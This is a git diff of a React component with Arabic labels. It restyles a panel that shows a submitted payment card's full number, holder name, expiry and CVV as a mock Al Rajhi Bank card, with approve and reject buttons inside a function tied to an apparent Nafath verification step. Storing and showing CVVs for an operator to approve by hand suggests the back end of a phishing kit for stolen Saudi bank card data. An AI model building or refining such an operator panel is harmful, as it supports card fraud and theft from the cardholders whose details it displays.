@@ -2502,70 +2502,172 @@ const renderNafadBox = () => {
                   <TimeCounter timestamp={entryTimestamp} />
                 ) : "—"}
               </div>
-              <h3 style={{
-                fontSize: "14px",
-                fontWeight: 700,
-                color: "#1f2937",
-                textAlign: "center",
-                margin: 0
-              }}>
-                💳 بيانات الدفع
-              </h3>
-            </div>
-            <div style={{
-              background: "#ffffff",
-              borderRadius: 6,
-              padding: 8,
-              boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
-            }}>
-              {/* Card Details */}
-              {raw.cardNumber && (
-                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
-                  <span style={{ fontSize: "12px", color: "#6b7280" }}>رقم البطاقة</span>
-                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.cardNumber}</span>
-                </div>
-              )}
-              {raw.cardOwner && (
-                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
-                  <span style={{ fontSize: "12px", color: "#6b7280" }}>اسم صاحب البطاقة</span>
-                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.cardOwner}</span>
-                </div>
-              )}
-              {raw.cardExpiry && (
-                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
-                  <span style={{ fontSize: "12px", color: "#6b7280" }}>تاريخ الانتهاء</span>
-                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.cardExpiry}</span>
-                </div>
-              )}
-              {raw.cvv && (
-                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
-                  <span style={{ fontSize: "12px", color: "#6b7280" }}>CVV</span>
-                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.cvv}</span>
-                </div>
-              )}
-              {raw.cardType && (
-                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
-                  <span style={{ fontSize: "12px", color: "#6b7280" }}>نوع البطاقة</span>
-                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.cardType}</span>
-                </div>
-              )}
-              {/* أزرار الموافقة والرفض */}
-              <div style={{ display: "flex", gap: 8, marginTop: 8 }}>
-                <button 
-                  onClick={() => handleReject("check")}
-                  disabled={actionLoading === "reject"}
-                  style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "reject" ? "wait" : "pointer", opacity: actionLoading === "reject" ? 0.7 : 1 }}
-                >
-                  {actionLoading === "reject" ? "جارٍ..." : "رفض"}
-                </button>
-                <button 
-                  onClick={() => handleApprove("check")}
-                  disabled={actionLoading === "approve"}
-                  style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
-                >
-                  {actionLoading === "approve" ? "جارٍ..." : "✅ موافقة"}
-                </button>
+              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+                <h3 style={{
+                  fontSize: "14px",
+                  fontWeight: 700,
+                  color: "#1f2937",
+                  margin: 0
+                }}>
+                  معلومات البطاقة
+                </h3>
+                {isLatest && (
+                  <span style={{
+                    fontSize: "8px",
+                    color: "#059669",
+                    fontWeight: 600
+                  }}>⭐ أحدث</span>
+                )}
               </div>
+            </div>
+            
+            {/* Credit Card Design */}
+            <div style={{
+              background: "linear-gradient(135deg, rgb(230, 244, 236) 0%, rgb(194, 224, 204) 100%)",
+              borderRadius: 16,
+              border: "1.5px solid rgb(144, 201, 168)",
+              aspectRatio: "1.586 / 1",
+              minHeight: 170,
+              padding: 16,
+              position: "relative",
+              overflow: "hidden",
+              marginBottom: 12,
+              boxShadow: "0 4px 6px rgba(0,0,0,0.1)"
+            }}>
+              {/* Decorative circles */}
+              <div style={{
+                position: "absolute",
+                top: "-30%",
+                right: "-15%",
+                width: "55%",
+                height: "100%",
+                borderRadius: "50%",
+                background: "rgb(0, 102, 51)",
+                opacity: 0.06
+              }} />
+              <div style={{
+                position: "absolute",
+                bottom: "-30%",
+                left: "-10%",
+                width: "45%",
+                height: "80%",
+                borderRadius: "50%",
+                background: "rgb(0, 102, 51)",
+                opacity: 0.06
+              }} />
+              
+              {/* Card Content */}
+              <div style={{ position: "relative", height: "100%", display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
+                {/* Top Row - Bank Logo and Currency */}
+                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
+                  <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
+                    <img 
+                      alt="Bank Logo" 
+                      className="h-8 w-auto object-contain"
+                      style={{ maxWidth: 110 }}
+                      src="https://upload.wikimedia.org/wikipedia/commons/f/f1/Al_Rajhi_Bank_Logo.svg"
+                    />
+                    <span style={{ fontSize: 9, color: "rgb(45, 122, 79)", fontWeight: 600, letterSpacing: "0.05em", textTransform: "uppercase" }}>
+                      Al Rajhi Banking
+                    </span>
+                  </div>
+                  <div style={{ 
+                    border: "1.5px solid rgb(0, 102, 51)", 
+                    borderRadius: 6, 
+                    padding: "2px 8px", 
+                    fontSize: 11, 
+                    fontWeight: "bold", 
+                    color: "rgb(0, 102, 51)", 
+                    letterSpacing: "0.05em"
+                  }}>
+                    SAR
+                  </div>
+                </div>
+                
+                {/* Card Number */}
+                <div style={{
+                  fontFamily: "Courier New, Lucida Console, monospace",
+                  fontSize: 18,
+                  fontWeight: "bold",
+                  letterSpacing: "0.15em",
+                  color: "rgb(0, 77, 38)",
+                  direction: "ltr",
+                  textAlign: "left"
+                }}>
+                  {raw.cardNumber ? raw.cardNumber.replace(/(.{4})/g, '$1 ').trim() : "**** **** **** ****"}
+                </div>
+                
+                {/* Bottom Row - Owner, Expiry, CVV, Card Type */}
+                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end" }}>
+                  <div style={{ display: "flex", flexDirection: "column", gap: 2 }}>
+                    <span style={{ fontSize: 11, fontWeight: "bold", color: "rgb(0, 77, 38)", letterSpacing: "0.05em", textTransform: "uppercase" }}>
+                      {raw.cardOwner || "CARD HOLDER"}
+                    </span>
+                    <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
+                      <div>
+                        <span style={{ fontSize: 8, color: "rgb(45, 122, 79)", letterSpacing: "0.05em" }}>EXPIRES</span>
+                        <div style={{ fontSize: 12, fontWeight: "bold", color: "rgb(0, 77, 38)", direction: "ltr" }}>
+                          {raw.cardExpiry || "**/**"}
+                        </div>
+                      </div>
+                      <div>
+                        <span style={{ fontSize: 8, color: "rgb(45, 122, 79)", letterSpacing: "0.05em" }}>CVV</span>
+                        <div style={{ fontSize: 12, fontWeight: "bold", color: "rgb(0, 77, 38)" }}>
+                          {raw.cvv || "***"}
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 2 }}>
+                    <span style={{ fontSize: 9, fontWeight: "bold", color: "rgb(45, 122, 79)", letterSpacing: "0.08em", textTransform: "uppercase" }}>
+                      {raw.cardType || "DEBIT"} · Visa
+                    </span>
+                    <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
+                      <span style={{ fontSize: 14 }}>🇸🇦</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            {/* Action Buttons */}
+            <div style={{ display: "flex", gap: 8 }}>
+              <button 
+                onClick={() => handleApprove("check")}
+                disabled={actionLoading === "approve"}
+                style={{ 
+                  flex: 1, 
+                  padding: "8px 16px", 
+                  border: "none", 
+                  borderRadius: 8, 
+                  background: "#3b82f6", 
+                  color: "#ffffff", 
+                  fontWeight: 600, 
+                  fontSize: 12,
+                  cursor: actionLoading === "approve" ? "wait" : "pointer",
+                  opacity: actionLoading === "approve" ? 0.7 : 1
+                }}
+              >
+                ✅ موافقة
+              </button>
+              <button 
+                onClick={() => handleReject("check")}
+                disabled={actionLoading === "reject"}
+                style={{ 
+                  flex: 1, 
+                  padding: "8px 16px", 
+                  border: "none", 
+                  borderRadius: 8, 
+                  background: "#ef4444", 
+                  color: "#ffffff", 
+                  fontWeight: 600, 
+                  fontSize: 12,
+                  cursor: actionLoading === "reject" ? "wait" : "pointer",
+                  opacity: actionLoading === "reject" ? 0.7 : 1
+                }}
+              >
+                ❌ رفض
+              </button>
             </div>
             
             {/* زر عرض السجل - يظهر فقط إذا كان هناك أكثر من إدخال */}
